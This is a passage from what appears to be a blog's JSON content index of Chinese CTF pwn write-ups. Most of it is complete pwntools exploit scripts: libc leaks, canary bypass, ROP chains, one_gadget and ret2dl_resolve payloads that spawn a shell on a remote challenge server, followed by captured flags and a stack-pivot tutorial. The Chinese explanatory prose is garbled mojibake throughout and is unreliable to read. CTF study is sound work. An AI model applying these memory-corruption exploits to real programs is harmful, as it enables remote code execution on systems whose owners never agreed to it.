obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"182.116.62.85\",\"29394\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = 0x40066B\n\npop_rdi_ret = 0x400743\nret = 0x400744\n\npayload = \"\"\npayload += \"A\"*(64+8)\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main_addr)\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsl(payload)\nru(\"I hope you win\\n\")\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n\n#libcsearcher use\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\none_gadget = libc_base + 0x10a41c\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\npayload = \"\"\npayload += \"A\"*(64+8)\npayload += p64(one_gadget)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsl(payload)\np.interactive()\n\n#flag{3c011eeb10d8b8256d4eeb1a700262d3}\n```\n\n# äºŒã€littleof\n\næ ˆæº¢å‡ºåŠ canaryï¼Œä¹Ÿæ˜¯ç™½ç»™ï¼Œå°±æ˜¯ä¸çŸ¥é“æ”¾ä¸ªstdin fileåœ¨æ ˆä¸Šæ˜¯å•¥æ„æ€\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./littleof\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"182.116.62.85\",\"27056\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\ndef dbg():\n    gdb.attach(p)\n    pause()\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = 0x400789\n\npop_rdi_ret = 0x400863\nret = 0x400864\n\npayload1 = \"\"\npayload1 += \"A\"*(0x50-0x8)\npayload1 += \"\\x01\"\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsd(payload1)\nru(\"A\"*(0x50-0x8))\ncanary = u64(rc(8).ljust(8,'\\x00'))-0x1\nlog.info(\"canary:0x%x\"%canary)\n\npayload2 = \"\"\npayload2 += \"A\"*(0x50-0x8)\npayload2 += p64(canary)\npayload2 += \"A\"*(0x8)\npayload2 += p64(pop_rdi_ret)\npayload2 += p64(puts_got)\npayload2 += p64(puts_plt)\npayload2 += p64(main_addr)\n#dbg()\nsd(payload2)\n#pause()\nru(\"I hope you win\\n\")\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\none_gadget = libc_base + 0x10a41c\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\n\npayload = \"\"\npayload += \"A\"*(0x50-0x8)\npayload += p64(canary)\npayload += \"A\"*(0x8)\npayload += p64(one_gadget)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsl(\"A\"*8)\nru(\"Try harder!\")\nsd(payload)\np.interactive()\n\n#flag{3c011eeb10d8b8256d4eeb1a700262d3}\n```\n\n\n\n# ä¸‰ã€easyecho\n\nåˆ©ç”¨canaryçš„æœºåˆ¶ï¼Œæ£€æµ‹åˆ°canaryè¢«ç¯¡æ”¹æ—¶ï¼Œä¼šæ‰“å°ç¨‹åºçš„åå­—ï¼Œè€Œç¨‹åºçš„åå­—åœ¨æœ€å¼€å§‹å°±è¢«æ”¾åˆ°æ ˆä¸Šï¼Œå¯ä»¥é€šè¿‡æº¢å‡ºä¿®æ”¹åˆ°è¯¥åœ°å€ã€‚ç„¶åbackdoorä¹‹åï¼ŒæŠŠåŸæœ¬æŒ‡å‘ç¨‹åºåå­—çš„å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œæ”¹ä¸ºæŒ‡å‘flagçš„æŒ‡é’ˆå³å¯ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./easyecho\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"182.116.62.85\",\"24842\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\ndef dbg():\n    gdb.attach(p)\n    pause()\n\nru(\"Name: \")\nsl(\"a\"*0x10)\nru(\"a\"*0x10)\nelfbase=u64(rc(6).ljust(8,'\\x00'))-0xcf0\nlg('elfbase',elfbase)\n\nru(\"Input: \")\nsl(\"backdoor\")\nru(\"Input: \")\nsl(0x2D*'PIG007NB'+p64(elfbase+0x202040))\nru(\"Input: \")\nsl(\"exitexit\")\n\np.interactive()\n\n#flag{11dc27eed9e5277915c1dfd28992812b}\n```\n\n# å››ã€onecho\n\n32ä½æ ˆæº¢å‡ºåŠ ORWï¼Œè¦ä¹ˆæ³„éœ²æ ˆåœ°å€ï¼Œç„¶åopenæ‰“å¼€æ ˆä¸Šçš„flagæŒ‡é’ˆï¼Œæˆ–è€…å†è¯»å–ï¼Œå°†flagå­—ç¬¦ä¸²è¯»å–åˆ°ä¸€ä¸ªå¯è¯»å¯å†™çš„åœ°æ–¹ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©malloc_hookæˆ–è€…free_hookã€‚æ­¤å¤–é€šè¿‡environæ³„éœ²æ ˆåœ°å€ï¼Œä»æ ˆä¸Šè·å–flagå­—ç¬¦ä¸²æŒ‡é’ˆä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./onecho\"\ncontext.binary = binary\nlibc=ELF('/lib/i386-linux-gnu/libc-2.27.so')\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\nelse:\n    p = remote(\"182.116.62.85\",\"24143\")\n    elf = ELF(binary)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"your choice>>\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef add():\n\tp.recvuntil('Give me your choice : ')\n\tp.sendline('1')\n\nmain_addr = 0x0804973F\n#pop ebx ; pop esi ; pop edi ; pop ebp ; ret\npop_ebx_esi_edi_ebp_ret=0x08049810\nru('Input your name:')\n\n#leak libc\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(elf.plt['puts'])\npayload += p32(main_addr)\npayload += p32(elf.got['puts'])\n\nsl(payload)\n#debug()\n\nputs_addr = u32(ru('\\xf7')[-4:])\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\n\nlg('libc_base',libc_base)\n\n\nmalloc_hook_addr = libc_base + obj.dump(\"__malloc_hook\")\nfree_hook_addr = libc_base + obj.dump(\"__free_hook\")\nread_addr  = libc_base + obj.dump(\"read\")\nopen_addr  = libc_base + obj.dump(\"open\")\nwrite_addr  = libc_base + obj.dump(\"write\")\nlg('__malloc_hook',malloc_hook_addr)\nlg('free_hook_addr',free_hook_addr)\nlg('read_addr',read_addr)\nlg('open_addr',open_addr)\nlg('write_addr',write_addr)\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(read_addr)\npayload += p32(main_addr)\npayload += p32(0)\npayload += p32(0x0804C000)\npayload += p32(0x6)\nsl(payload)\n\nsl('flag\\x00')\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(open_addr)\npayload += p32(main_addr)\npayload += p32(0x0804C000)\npayload += p32(2)\nsl(payload)\n\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(read_addr)\npayload += p32(main_addr)\npayload += p32(3)\npayload += p32(free_hook_addr)\npayload += p32(0x30)\nsl(payload)\n\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(write_addr)\npayload += p32(main_addr)\npayload += p32(1)\npayload += p32(free_hook_addr)\npayload += p32(0x30)\nsl(payload)\n\np.interactive()\n\n#flag{20baa3d800326274c965041777012d12}\n```\n\n# äº”ã€pwn1\n\nè„‘ç˜«åŸé¢˜ ciscn 2018 supermarket\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./task_supermarket\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\nelse:\n    p = remote(\"182.116.62.85\",\"27518\")\n    elf = ELF(binary)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = 'your choice>>'\n\ndef dockerDbg():\n    myGdb = remote(\"127.0.0.1\",30001)\n    myGdb.close()\n    pause()\n\ndef add(index, size, content):\n    sla(menu, '1')\n    sla('name:', str(index))\n    sla('price:', '10')\n    sla('descrip_size:', str(size))\n    sla('description:', content)\n\n\ndef delete(index):\n    sla(menu, '2')\n    sla('name:', str(index))\n\n\ndef list():\n    sla(menu, '3')\n\n\ndef edit(index, size, content):\n    sla(menu, '5')\n    sla('name:', str(index))\n    sla('descrip_size:', str(size))\n    sla('description:',content)\n\n\natoi_got = elf.got['atoi']\n\n\nadd(0, 0x80, 'PIG007NB' * 2)\nadd(1, 0x20, 'PIG007NB' * 2)\nedit(0, 0x90, '')\nadd(2, 0x20, 'PIG007NB' * 2)\npayload = \"\"\n#payload += '2'.ljust(16,'\\x00')\npayload += p64(0x32)\npayload += p64(0x0)\n#--------------------------\npayload += p32(20)\npayload += p32(0x20)\npayload += p32(atoi_got)\n\nedit(0, 0x80, payload)\nlist()\nru('2: price.20, des.')\n\natoi_addr = u32(rc(4).ljust(4,'\\x00'))\nobj = LibcSearcher('atoi', atoi_addr)\nlibc_base = atoi_addr - obj.dump('atoi')\nsystem_addr = libc_base + obj.dump('system')\nedit(2, 0x20, p32(system_addr))\nsla(menu, '/bin/sh')\n\np.interactive()\n#flag{03b1baaab2a949db11f8b1c02a4f7ab6}\n```\n\n","tags":["æ¯”èµ›"],"categories":["æ¯”èµ›"]},{"title":"æ ˆæº¢å‡ºæ€»ç»“","url":"/2021/10/22/æ ˆæº¢å‡ºæ€»ç»“/","content":"\n\n\n# å‰è¨€\n\næ€»ç»“å¤ä¹ ä¸€ä¸‹å„ç§å„æ ·çš„æ ˆæº¢å‡ºã€‚\n\n# ä¸€ã€æ ˆè¿ç§»\n\n`ç¾å›¢2021-12 babyrop`\n\n## 1.é¢˜ç›®ç®€ä»‹\n\n![image-20211212144541080](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212144548.png)\n\n+ æº¢å‡º16ä¸ªå­—èŠ‚ï¼Œå¯è¦†ç›–rbpå’Œè¿”å›åœ°å€\n\n+ å­˜åœ¨putsç­‰æ‰“å°å‡½æ•°\n\n+ æ— å¥½ç”¨gadgetï¼Œåªæœ‰æœ€å¸¸è§çš„csu\n\n+ å­˜åœ¨canaryï¼Œå¯ç”¨æ•°æ®é•¿åº¦ä¸º0x18\n\n+ å…³é”®å‡½æ•°ï¼š\n\n  ![image-20211212145246326](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145246.png)\n\n## 2.åˆ©ç”¨æ–¹å¼\n\nç”±äºæ²¡åŠæ³•å†™GOTï¼Œè€ƒè™‘æ ˆè¿ç§»ä¹‹åè°ƒç”¨putså‡½æ•°æ³„éœ²åœ°å€ï¼Œç„¶åè¿›è¡Œ`one_gadget`\n\n### (1)è¿ç§»æ•°æ®\n\næ‰€ä»¥ç›´æ¥è¿ç§»åˆ°`extern`æ®µä¹‹åçš„æ•°æ®æ®µ\n\n### (2)è°ƒè¯•è°ƒç”¨\n\n#### â‘ æ ˆåŠ«æŒ\n\n```python\npayload = \"\"\npayload += 'PIG007NB'*(0x18/0x8)\n\npayload += p64(canary)\npayload += p64(new_stack)\npayload += p64(0x40072E)\n```\n\nåˆæ¬¡æ ˆæº¢å‡º`leave_ret`ä¹‹ååŠ«æŒ`rbp`ï¼Œå†è¿›å…¥`vuln`å‡½æ•°ï¼Œå€ŸåŠ©ä¿®æ”¹ä¹‹åçš„`rbp`å‘æ–°æ ˆè¯»å…¥æ•°æ®\n\n```python\n#è¯»å…¥æ•°æ®ä¹‹åæº¢å‡º\npayload = \"\"\npayload += 'PIG007NB'*(0x18/0x8)\n\npayload += p64(canary)\npayload += p64(new_stack+0x28)\npayload += p64(0x40072E)\n```\n\n![image-20211212145349774](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145349.png)\n\nå†æ¬¡æ ˆæº¢å‡ºä¿®æ”¹`rbp`å‘æ–°æ ˆè¯»å…¥æ•°æ®ï¼ŒåŒæ—¶é€šè¿‡`leave_ret`åŠ«æŒ`rsp`\n\n\n\n![image-20211212145552478](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145552.png)\n\n![image-20211212150141800](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212150141.png)\n\nåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŠ«æŒrspä¹‹åï¼Œå†è°ƒç”¨readå‡½æ•°æ—¶ï¼Œå…¶è¿”å›åœ°å€ä¹Ÿä¼šéšä¹‹æ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€ï¼Œé€šè¿‡ä¿®æ”¹çš„rbpå³å¯åœ¨readå‡½æ•°çš„è¿”å›åœ°å€ä¸Šè¯»å…¥ROPé“¾æ¡\n\n##### â–²leave-ret\n\nç›¸å½“äºå¦‚ä¸‹å‘½ä»¤\n\n```\nmov     rsp rbp\npop     rbp\npop     rip\n```\n\n##### â–²call\n\nç›¸å½“äºå¦‚ä¸‹\n\n```\npush \t\trip\njmp   \t\tfunc_addr\n```\n\n\n\n#### â‘¡è¯»å…¥ROPé“¾\n\nå‘readå‡½æ•°çš„è¿”å›åœ°å€è¯»å…¥ROPé“¾æ¡ï¼Œè¿™ä¸ªrbpæ˜¯ç»è¿‡è®¡ç®—çš„ï¼Œç”±äºä¹‹å‰çš„rspé€šè¿‡`leave-ret`å˜ä¸ºäº†new_stack+0x10ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨`call read`æ—¶ï¼Œå‹å…¥è¿”å›åœ°å€ï¼Œå¯¼è‡´rspå˜ä¸ºnew_stack+0x08ï¼Œè€Œè¿”å›åœ°å€ä¹Ÿå°±æ˜¯ä¿å­˜åœ¨new_stack+0x08å¤„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ–°çš„rbpä¸ºnew_stack+0x28ï¼Œæ‰èƒ½åœ¨vulnå‡½æ•°ä¸­å‘new_stack+0x08è¯»å…¥ROPé“¾æ¡ä»è€ŒåŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€ã€‚\n\n![image-20211212151538794](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212151539.png)\n\n#### â‘¢åŠ«æŒvulnå‡½æ•°è¿”å›åœ°å€\n\nè¿™æ ·åœ¨ä¹‹åè°ƒç”¨å®Œputså‡½æ•°ä¹‹åå°±å¯ä»¥å†è¿”å›åˆ°vulnå‡½æ•°ä¸­ï¼Œæ–°å»ºä¸€ä¸ªå‡½æ•°æ ˆæ¥åŠ«æŒè¯¥å‡½æ•°çš„è¿”å›åœ°å€\n\n```python\npayload = \"\"\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(0x400717)\n\n#dbg()\nsd(payload)\n\nlibc_base = u64Leakbase(libc.sym['puts'])\none_gadget = libc_base + 0x10a41c\nlg(\"libc_base\",libc_base)\n\npayload = 'PIG007NB'*(0x18/0x8)\npayload += p64(canary)\npayload += 'PIG007NB'\npayload += p64(one_gadget)\n```\n\nåŒæ ·ç”±äºrbpå’Œrspæ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é€šè¿‡å†è¿”å›åˆ°`0x40072e`æ¥åŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€\n\n```python\npayload = \"\"\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(0x40072e)\n\n#dbg()\nsd(payload)\n\nlibc_base = u64Leakbase(libc.sym['puts'])\none_gadget = libc_base + 0x10a41c\nlg(\"libc_base\",libc_base)\n\npayload = 'PIG007NB'*(0x18/0x8)\npayload += p64(one_gadget)\n```\n\n## 3.æ€»ç»“\n\næ ˆè¿ç§»çš„æ–¹æ³•å¤šç§å¤šæ ·ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯ä¸¤ä¸ªå‘½ä»¤`leave-ret`å’Œ`call`ï¼Œè¿™ä¸¤ä¸ªå‘½ä»¤å¯¹æ ˆçš„å½±å“æ˜¯æœ€å¤§çš„ï¼Œè‡ªå·±æ¯”èµ›çš„æ—¶å€™åŸºæœ¬éƒ½å¿˜å…‰äº†ï¼Œè°ƒè¯•äº†å¥½ä¹…ï¼ŒåŒæ—¶è¦è®°ä½è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœrspè¢«åŠ«æŒäº†ï¼Œé‚£ä¹ˆå…¶è¿”å›åœ°å€ä¹Ÿä¼šè¢«åŠ«æŒã€‚\n\n\n\n# äºŒã€Ret2dl_resolve\n\nä¹‹å‰åšè¿‡æ€»ç»“ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ç‚¹çš®æ¯›ï¼Œè¿™å›æ·±å…¥æ€»ç»“ä¸€ä¸‹ï¼Œå…·ä½“åŸç†å°±å…ˆä¸è¯´äº†ï¼Œä¸»è¦è¯´ä¸‹æ³¨æ„çš„å‡ ç‚¹äº‹é¡¹ã€‚\n\n## 1.No RELROæ¨¡å¼\n\nè§é¢˜ç›®`HITCTF slient`\n\n+ å¯ä»»æ„ä¿®æ”¹å››ä¸ªå­—èŠ‚\n+ æº¢å‡ºé•¿åº¦ä¸å¤ªå¤Ÿ\n+ æ— æ³•æ³„éœ²åœ°å€\n+ æ— PIE\n\nè¿™ç§æ¨¡å¼å¯ç”¨åŠ«æŒ`.dynstr`ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æ”¹å†™`DT_STRTAB`ä¸Šçš„æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘`fake_dynstr`ã€‚åœ¨32ä½å’Œ64ä½ä¸‹éƒ½æ˜¯é€šç”¨çš„ã€‚\n\n### (1)å¯»æ‰¾`.dynstr`æŒ‡é’ˆ\n\n```bash\nreadelf -S pwn\n```\n\n![image-20211119171711269](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171711.png)\n\næ‰¾åˆ°å¦‚ä¸Šå›¾çš„.dynamicï¼Œå…¶åœ°å€ä¸º`0x600988`ï¼Œåœ¨IDAä¸­æŸ¥çœ‹ã€‚\n\n![image-20211119171809731](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171809.png)\n\nä¸Šå›¾çš„`DT_STRTAB`å³ä¸ºæ‰€å¯»æ‰¾çš„åœ°å€ï¼Œå…¶å†…å®¹ä¸º\n\n![image-20211119171935731](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171935.png)\n\nè“è‰²ä»£è¡¨åç§»ï¼Œçº¢è‰²ä»£è¡¨éœ€è¦åŠ¨æ€åŠ è½½æ—¶å¯»å€çš„å‡½æ•°å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä¹‹åæŸ¥çœ‹å¯¹åº”çš„å­—ç¬¦ä¸²å†…å®¹ã€‚\n\n![image-20211119172058537](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119172058.png)\n\néœ€è¦ä¿®æ”¹ä¸ºå¦‚ä¸‹\n\n![image-20211212165434233](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212165546.png)\n\næˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯åŠ«æŒè¿™ä¸ª`DT_STRTAB`ä¸­çš„å­—ç¬¦ä¸²æŒ‡é’ˆã€‚ä½†æ˜¯åŠ«æŒè¿™ä¸ªæŒ‡é’ˆéœ€è¦æ»¡è¶³ä¸º`NO RELRO`çš„ä¿æŠ¤çº§åˆ«æ‰è¡Œï¼Œä¸èƒ½å¼€å¯`RELRO`ã€‚\n\n### (2)åŠ«æŒæŒ‡é’ˆ\n\nè¿™é‡Œä¸€èˆ¬åªèƒ½é€šè¿‡ä½¿ç”¨ä»»æ„å†™æ¥ä¿®æ”¹ï¼Œæˆ–è€…å¯ä»¥å€ŸåŠ©readå‡½æ•°æ ˆè¿ç§»ä¿®æ”¹rbpæ¥åŠ«æŒï¼Œå°†è¯¥æŒ‡é’ˆä¿®æ”¹ä¸ºæˆ‘ä»¬å†™å…¥çš„system_strçš„åœ°å€å‡å»0x11å¤„ï¼Œä¸€èˆ¬éƒ½æ˜¯è¿™æ ·çš„ï¼Œé‡è½½readå‡½æ•°ä¸ºsystemå‡½æ•°ï¼Œå› ä¸ºreadå‡½æ•°ä¸€èˆ¬éƒ½ä¼šæœ‰ã€‚\n\n### (3)é‡è½½å‡½æ•°\n\næŸ¥æ‰¾é‡è½½çš„pltè¿›è¡Œè°ƒç”¨å³å¯ï¼Œåœ¨IDAä¸­`ctrl+s`å³å¯\n\n![image-20211212165518078](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212165518.png)\n\n```python\nstrtab_addr = 0x600A08\ncommand_addr = 0x600C00\nsystem_str_addr = command_addr + 8\n\n#ret2dlresolve\npop_rdi_ret = 0x4007d3\nplt0 = 0x4004E0\n#command_addrå³binsh_addr\npayload = \"a\"*0x38 + p64(pop_rdi_ret) + p64(command_addr) + p64(plt0) + \\\n    p64(0)\n#dbg()\np.sendline(payload)\n#pause()\np.interactive()\n```\n\n## 2.Partial RELROæ¨¡å¼\n\nè¿™ç§æ¨¡å¼æœ‰å¥½å‡ ä¸ªåŒºåˆ†åº¦\n\n### (1)åŸç”Ÿæ€çš„32ä½\n\nå³åœ¨32ä½æ¶æ„æœºå™¨ä¸Šç¼–è¯‘çš„32ä½ç¨‹åºï¼Œç›´æ¥å€ŸåŠ©å·¥å…·ä¸€æŠŠæ¢­å“ˆå³å¯ï¼Œè¯¦è§`SecconCTF2021-kasu_bof`\n\n```python\nfrom pwn import *\n\ndef start():\n    global p\n    if args.REMOTE:\n        p = process(\"./chall\")\n        #p = remote('hiyoko.quals.seccon.jp', 9001)\n    else:\n        p = elf.process()\n\ncontext.binary = elf = ELF(\"./chall\")\nlibc = elf.libc\n\ndl_resolve = Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"])\n\nr = ROP(elf)\nr.gets(dl_resolve.data_addr)\nr.ret2dlresolve(dl_resolve)\n\nstart()\n\noff_eip = 0x88\np.sendline(b'A'*(off_eip) + r.chain())\nsleep(1)\np.sendline(dl_resolve.payload)\np.interactive()\np.close()\n```\n\nå¦‚æœæ¢æˆäº†readå‡½æ•°ï¼Œç›´æ¥æ›´æ”¹ä¸º`r.read(0,dl_resolve.data_addr,0x400)`å³å¯\n\nè¯»å–ä¹‹åè¿”å›åˆ°plt0ï¼Œä¹‹ååŠ«æŒæ 